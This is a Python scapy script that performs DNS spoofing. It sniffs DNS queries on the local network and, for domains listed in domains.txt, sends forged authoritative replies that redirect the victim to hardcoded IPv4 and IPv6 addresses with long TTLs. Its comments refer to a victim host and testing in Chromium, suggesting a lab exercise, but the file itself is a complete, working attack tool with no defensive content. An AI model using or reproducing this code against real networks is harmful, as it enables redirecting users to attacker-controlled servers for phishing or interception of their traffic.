from scapy.all import *
from os import system
#Test in google chromium
#Clear Google DNS Cache in url bar type chrome://net-internals/#dns
def spoof_dns(pkt):
    
    hostdict = {}
    domains = open('domains.txt','r')
    urls = domains.readlines()
    d = 0
    for url in urls:
        tobytes = bytes(url.strip(), encoding="utf-8")
        hostdict[tobytes] = "1"
        d = d + 1

    for key in hostdict: #For loop to check each name in hostDict
        
        if (DNS in pkt and key in pkt[DNS].qd.qname): #Check if qname in packet matches any domain name in the hostDict
            print(f'packet found {key}')
            if IP in pkt:
                print(pkt[IP].src)
                print(pkt[IP].dst)
                IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst) #Switch source to be destination packet payload is sent back to the victim
                
                UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)

                Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata='160.153.63.10') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim

                NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata='160.153.63.10')

                DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)
                #Set qr to 1 to represent a response packet

                spoofpkt = IPpkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt

                send(spoofpkt,iface="enp0s3") #Send spoofed packet to the the victim
            elif IPv6 in pkt:
                print(pkt[IPv6].src)
                print(pkt[IPv6].dst)
                IPv6pkt = IPv6(dst=pkt[IPv6].src,src=pkt[IPv6].dst) #Switch source to be destination packet payload is sent back to the victim
                
                UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)

                Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='AAAA',ttl=259200,rdata='2606:4700:3031::6815:ef9') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim

                NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata='2606:4700:3031::6815:ef9')

                DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)
                #Set qr to 1 to represent a response packet

                spoofpkt = IPv6pkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt

                send(spoofpkt,iface="enp0s3") #Send spoofed packet to the the victim

#pkt=sniff(filter='udp and (src host 192.168.1.163 and dst port 53)', prn=spoof_dns) #Sniff all packets of destination port 53 for host 10.0.2.15
system('sudo resolvectl flush-caches')
pkt=sniff(filter='udp and dst port 53', prn=spoof_dns)
print(pkt.summary())
